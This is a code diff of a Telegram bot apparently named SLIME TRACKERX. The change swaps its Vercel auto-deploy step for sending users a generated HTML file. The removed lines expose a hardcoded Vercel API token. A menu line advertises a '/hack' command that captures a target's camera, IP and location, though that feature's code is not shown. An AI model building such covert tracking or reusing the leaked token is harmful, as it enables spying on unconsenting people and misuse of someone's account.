@@ -9,16 +9,11 @@ const path = require("path");
 const crypto = require("crypto");
 const mongoose = require("mongoose");
 const fs = require("fs-extra");
-const archiver = require("archiver");
 const multer = require("multer");
 const axios = require("axios");
-const FormData = require("form-data");
 
 const bot = new Telegraf(process.env.BOT_TOKEN);
 const app = express();
-
-// ========== VERCEL CONFIG ==========
-const VERCEL_TOKEN = "vcp_1HgHd18aJoERfWmE1pyz2zMhxpo6waJlHwIzy8nlUBDzOHBs6z3POSk2";
 
 // ========== BOT CONFIG ==========
 const DOMAIN = "https://virtualnumbersfree.onrender.com";
@@ -114,7 +109,6 @@ const websiteSchema = new mongoose.Schema({
   template: String,
   content: Object,
   url: String,
-  vercelId: String,
   views: { type: Number, default: 0 },
   createdAt: { type: Date, default: Date.now }
 });
@@ -285,56 +279,13 @@ async function redeemCode(userId, code) {
   return { ok: true, msg: `✅ +${c.coins} coins!${c.diamonds > 0 ? ` +${c.diamonds}💎` : ''}` };
 }
 
-// ========== VERCEL DEPLOY - FULLY WORKING ==========
-async function deployToVercel(htmlContent, siteName) {
-  try {
-    if (!htmlContent) {
-      return { success: false, error: "No HTML content" };
-    }
-    
-    const cleanName = siteName.toLowerCase().replace(/[^a-z0-9]/g, '-').replace(/-+/g, '-').replace(/^-|-$/g, '').substring(0, 15) || 'site';
-    const uniqueName = `${cleanName}-${Date.now()}`;
-    const tempDir = path.join(__dirname, "exports", uniqueName);
-    
-    console.log(`🚀 Deploying to Vercel: ${uniqueName}`);
-    
-    await fs.ensureDir(tempDir);
-    await fs.writeFile(path.join(tempDir, "index.html"), htmlContent);
-    
-    const zipPath = path.join(__dirname, "exports", `${uniqueName}.zip`);
-    const output = fs.createWriteStream(zipPath);
-    const archive = archiver("zip", { zlib: { level: 9 } });
-    
-    await new Promise((resolve, reject) => {
-      output.on("close", resolve);
-      archive.on("error", reject);
-      archive.pipe(output);
-      archive.directory(tempDir, false);
-      archive.finalize();
-    });
-    
-    const formData = new FormData();
-    formData.append("file", fs.createReadStream(zipPath));
-    
-    const response = await axios.post("https://api.vercel.com/v13/deployments", formData, {
-      headers: {
-        "Authorization": `Bearer ${VERCEL_TOKEN}`,
-        ...formData.getHeaders()
-      },
-      maxContentLength: Infinity,
-      maxBodyLength: Infinity,
-      timeout: 120000
-    });
-    
-    await fs.remove(tempDir).catch(() => {});
-    await fs.remove(zipPath).catch(() => {});
-    
-    return { success: true, url: response.data.url, siteName: uniqueName };
-    
-  } catch (error) {
-    console.error("❌ Vercel Error:", error.message);
-    return { success: false, error: error.message, html: htmlContent };
-  }
+// ========== NO API - JUST SEND HTML FILE ==========
+async function generateWebsite(htmlContent, siteName) {
+  return {
+    success: true,
+    html: htmlContent,
+    siteName: siteName
+  };
 }
 
 // ========== DOPE HTML TEMPLATES ==========
@@ -849,7 +800,7 @@ bot.command("buy", async (ctx) => {
   }
 });
 
-// CREATE WEB
+// ========== WEB CREATOR ==========
 bot.command("createweb", async (ctx) => {
   let args = ctx.message.text.split(" ");
   let template = args[1];
@@ -863,14 +814,25 @@ bot.command("createweb", async (ctx) => {
   };
   
   if (!template || !templates.includes(template)) {
-    return ctx.reply(`🌐 **WEB CREATOR** 🌐\n\n💰 Cost: ${WEB_PRICE} coins\n⚡ Auto-deploy to Vercel!\n\nTemplates: portfolio, business, store\n\nExample: /createweb portfolio`);
+    return ctx.reply(
+      `🌐 **DOPE WEB CREATOR** 🌐\n\n` +
+      `💰 Cost: ${WEB_PRICE} coins\n` +
+      `⚡ Get HTML file + Free hosting guide!\n\n` +
+      `/createweb portfolio\n` +
+      `/createweb business\n` +
+      `/createweb store\n\n` +
+      `🎨 Create a professional website in 2 minutes!`
+    );
   }
   
-  if (u.coins < WEB_PRICE) return ctx.reply(`❌ Need ${WEB_PRICE} coins! You have ${u.coins}`);
+  if (u.coins < WEB_PRICE) {
+    return ctx.reply(`❌ Need ${WEB_PRICE} coins! You have ${u.coins}\n\nEarn: /daily, /work, /dice, /slots`);
+  }
   
   await takeCoin(ctx.from.id, WEB_PRICE);
   webBuilds.set(ctx.from.id, { template, step: 0, data: {}, questions: questions[template] });
-  await ctx.reply(`✅ Selected: ${template}\n💰 -${WEB_PRICE} coins\n\n📝 Step 1/${questions[template].length}\nSend: ${questions[template][0]}`);
+  
+  await ctx.reply(`✅ Template: ${template}\n💰 -${WEB_PRICE} coins\n\n📝 Step 1/${questions[template].length}\nSend: ${questions[template][0]}`);
 });
 
 // MY WEBSITES
@@ -994,7 +956,18 @@ bot.command("setadmin", async (ctx) => {
 // ========== BUTTON HANDLERS ==========
 bot.action("menu_hack", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`💀 **HACK**\n\n/hack [label]\n💰 Cost: ${TRACK_COST} coins\n📸 Captures Camera + IP + Location`); });
 bot.action("menu_word", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`📝 **WORD BATTLE**\n\n/wordbattle @user amount difficulty\n💰 Winner takes ALL!`); });
-bot.action("menu_web", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`🌐 **WEB CREATOR**\n\n/createweb portfolio\n💰 Cost: ${WEB_PRICE} coins\n⚡ Auto-deploys to Vercel!`); });
+bot.action("menu_web", async (ctx) => { 
+  await ctx.answerCbQuery(); 
+  await ctx.reply(
+    `🌐 **DOPE WEB CREATOR** 🌐\n\n` +
+    `💰 Cost: ${WEB_PRICE} coins\n` +
+    `⚡ Auto-Deploy to Vercel!\n\n` +
+    `/createweb portfolio\n` +
+    `/createweb business\n` +
+    `/createweb store\n\n` +
+    `🎨 Create a professional website in 2 minutes!`
+  ); 
+});
 bot.action("menu_casino", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`🎰 **CASINO**\n\n/dice amount\n/slots amount`); });
 bot.action("menu_games", async (ctx) => { await ctx.answerCbQuery(); await ctx.reply(`🎮 **GAMES**\n\n/dice\n/slots\n/wordbattle`); });
 bot.action("menu_eco", async (ctx) => { await ctx.answerCbQuery(); let u = await initUser(ctx.from.id); await ctx.reply(`💰 **ECONOMY**\n\nBalance: ${u.coins} coins\n/daily\n/work`); });
@@ -1010,12 +983,6 @@ bot.action("menu_mywebsites", async (ctx) => { await ctx.answerCbQuery(); let we
 bot.on("text", async (ctx) => {
   if (ctx.message.text.startsWith("/")) return;
   
-  const msgId = `${ctx.chat.id}_${ctx.message.message_id}`;
-  if (processedMessages.has(msgId)) return;
-  processedMessages.add(msgId);
-  setTimeout(() => processedMessages.delete(msgId), 5000);
-  
-  // Handle web creation
   let build = webBuilds.get(ctx.from.id);
   if (build) {
     if (build.step < build.questions.length) {
@@ -1025,27 +992,45 @@ bot.on("text", async (ctx) => {
       if (build.step < build.questions.length) {
         await ctx.reply(`📝 Step ${build.step + 1}/${build.questions.length}\nSend: ${build.questions[build.step]}`);
       } else {
-        await ctx.reply("⏳ Creating your dope website and deploying to Vercel...");
+        await ctx.reply("⏳ Generating your dope website...");
         
         let html = htmlTemplates[build.template](build.data);
         let siteName = build.data[build.questions[0]] || "mywebsite";
-        let result = await deployToVercel(html, siteName);
+        let fileName = `${siteName.replace(/[^a-z0-9]/gi, '_')}.html`;
         
-        if (result.success) {
-          let website = new Website({ name: siteName, ownerId: ctx.from.id, template: build.template, content: build.data, url: result.url, vercelId: result.siteName });
-          await website.save();
-          let user = usersCache.get(ctx.from.id);
-          user.websites.push({ name: siteName, url: result.url });
-          await saveUser(ctx.from.id, user);
-          
-          await ctx.reply(`✅ **WEBSITE DEPLOYED TO VERCEL!** ✅\n\n🌐 ${result.url}\n\nShare it with anyone!`);
-          await ctx.reply(`🔗 **OPEN YOUR WEBSITE**`, { reply_markup: { inline_keyboard: [[{ text: "🌐 OPEN WEBSITE", url: result.url }]] } });
-        } else {
-          await ctx.reply(`❌ Vercel deployment failed: ${result.error}\n\nSending HTML file instead...`);
-          await ctx.replyWithDocument({ source: Buffer.from(html, 'utf-8'), filename: `${siteName.replace(/[^a-z0-9]/gi, '_')}.html` });
-          await ctx.reply(`📁 **HTML file sent!** Upload to Netlify Drop for live link: https://app.netlify.com/drop`);
-          await addCoin(ctx.from.id, WEB_PRICE);
-        }
+        // Send HTML file directly - NO ZIP!
+        await ctx.replyWithDocument({
+          source: Buffer.from(html, 'utf-8'),
+          filename: fileName
+        });
+        
+        await ctx.reply(
+          `✅ **WEBSITE HTML READY!** ✅\n\n` +
+          `📁 **File:** ${fileName}\n` +
+          `💰 **Cost:** -${WEB_PRICE} coins\n\n` +
+          `🌐 **GET A FREE LIVE LINK (10 seconds):**\n` +
+          `1️⃣ Go to https://app.netlify.com/drop\n` +
+          `2️⃣ Drag & drop the HTML file I just sent\n` +
+          `3️⃣ Your website is LIVE!\n\n` +
+          `🔗 **Example:** https://your-site-name.netlify.app\n\n` +
+          `💡 **Other free hosts:** Vercel, Render, GitHub Pages\n\n` +
+          `⭐ **Share your link with everyone!**`
+        );
+        
+        // Save to database
+        let website = new Website({
+          name: siteName,
+          ownerId: ctx.from.id,
+          template: build.template,
+          content: build.data,
+          url: "Upload to Netlify Drop",
+        });
+        await website.save();
+        
+        let user = usersCache.get(ctx.from.id);
+        user.websites.push({ name: siteName, url: "Upload to Netlify Drop" });
+        await saveUser(ctx.from.id, user);
+        
         webBuilds.delete(ctx.from.id);
       }
     }
@@ -1128,7 +1113,7 @@ loadData().then(async () => {
     await bot.launch({ dropPendingUpdates: true });
     console.log(`🤖 SLIME TRACKERX v40.0 LIVE!`);
     console.log(`✅ All commands working!`);
-    console.log(`✅ Vercel deploy ready!`);
+    console.log(`✅ Web creator ready!`);
     console.log(`✅ Hack system ready!`);
   } catch(e) { console.log("Error:", e.message); }
 });
